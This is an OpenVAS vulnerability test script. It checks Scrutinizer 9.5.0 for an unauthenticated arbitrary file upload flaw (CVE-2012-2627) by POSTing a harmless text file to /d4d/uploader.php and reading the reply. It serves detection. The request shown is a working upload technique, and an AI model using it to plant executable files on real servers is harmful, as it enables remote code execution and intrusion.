###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_scrutinizer_54726.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Scrutinizer Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:dell:sonicwall_scrutinizer';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103528");
  script_bugtraq_id(54726, 54727);
  script_cve_id("CVE-2012-2627", "CVE-2012-2626");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:C/A:C");
  script_version("$Revision: 13994 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-08-02 10:24:13 +0200 (Thu, 02 Aug 2012)");
  script_name("Scrutinizer Arbitrary File Upload Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_scrutinizer_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("scrutinizer/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54726");
  script_xref(name:"URL", value:"http://www.plixer.com");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"Scrutinizer is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"1. A vulnerability that lets attackers upload arbitrary files. The issue occurs
  because the application fails to adequately sanitize user-supplied input.

  An attacker may leverage this issue to upload arbitrary files to the
  affected computer, this can result in arbitrary code execution within
  the context of the vulnerable application.

  2. A security-bypass vulnerability.

  Successful attacks can allow an attacker to gain access to the affected application using
  the default authentication credentials.");

  script_tag(name:"affected", value:"Scrutinizer 9.5.0 is vulnerable, other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

useragent = http_get_user_agent();
host = http_host_name( port:port );
vtstrings = get_vt_strings();

file = vtstrings["lowercase_rand"] + ".txt";
len = 195 + strlen( file );

url = dir + "/d4d/uploader.php";

req = string("POST ", url, " HTTP/1.0\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: multipart/form-data; boundary=_Part_949_3365333252_3066945593\r\n",
             "Content-Length: ",len,"\r\n",
             "\r\n\r\n",
             "--_Part_949_3365333252_3066945593\r\n",
             "Content-Disposition: form-data;\r\n",
             'name="uploadedfile"; filename="', file,'"',"\r\n",
             "Content-Type: application/octet-stream\r\n",
             "\r\n",
             vtstrings["default"], "\r\n",
             "\r\n",
             "--_Part_949_3365333252_3066945593--\r\n\r\n");
result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( '"success":1' >< result && file >< result ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );